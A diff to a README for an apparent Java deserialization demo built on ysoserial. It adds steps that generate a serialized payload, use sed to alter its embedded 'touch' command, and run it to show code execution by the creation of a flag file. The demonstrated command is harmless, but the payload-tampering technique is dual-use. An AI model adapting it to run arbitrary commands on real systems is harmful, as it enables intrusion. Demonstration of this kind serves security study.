@@ -7,6 +7,22 @@ export JAVA_HOME=~/dev/jdk/jdk-11.0.2
 mvn clean install
 ```
 
+# Simple
+Generate a sample payload by running with no args:
+```
+java -jar simple/target/ysoserial-simple-1.0-SNAPSHOT.jar
+```
+
+Modify the payload to change the runnable command:
+```
+sed 's/touch Simple_serialized.flag/touch Simple_exploitedX.flag/g' SimpleSafe.payload.bin > SimpleExploit.payload.bin
+```
+
+Demonstrate the exploit with:
+```
+$JAVA_HOME/bin/java -jar simple/target/ysoserial-simple-1.0-SNAPSHOT.jar SimpleExploit.payload.bin
+```
+Verify that `Simple_exploitedX.flag` is created.
 
 ## Commons Collections 4.0
 Generate the payload with ysoserial:
